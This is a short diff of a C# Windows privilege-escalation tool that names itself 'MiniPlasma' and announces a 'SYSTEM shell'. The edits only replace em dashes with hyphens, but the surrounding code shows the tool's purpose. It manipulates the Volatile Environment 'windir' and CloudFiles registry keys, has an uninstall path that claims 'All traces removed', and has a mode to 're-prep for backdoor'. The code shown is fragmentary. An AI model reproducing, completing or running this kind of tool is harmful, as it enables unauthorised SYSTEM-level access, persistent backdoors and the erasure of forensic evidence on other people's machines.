@@ -302,7 +302,7 @@ if($r-eq 0){
     {
         /* Remove CloudFiles key */
         try { RecDelete(CF); } catch {}
-        /* Remove Volatile Environment windir (delete whole key — it's volatile) */
+        /* Remove Volatile Environment windir (delete whole key - it's volatile) */
         try { RecDelete(TK); } catch {}
         /* Remove run dir */
         try {
@@ -396,7 +396,7 @@ if($r-eq 0){
         Console.WriteLine("\n[+] Uninstall complete. All traces removed.");
     }
 
-    /* Stage 1 only — fast re-prep for backdoor */
+    /* Stage 1 only - fast re-prep for backdoor */
     static void Prep()
     {
         try {
@@ -417,7 +417,7 @@ if($r-eq 0){
         if (mode=="--prep")  { Prep(); return; }
 
         /* Default: escalate */
-        Console.WriteLine("=== priv — SYSTEM shell (MiniPlasma) ===\n");
+        Console.WriteLine("=== priv - SYSTEM shell (MiniPlasma) ===\n");
 
         string self = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
         string selfDir = Path.GetDirectoryName(self);
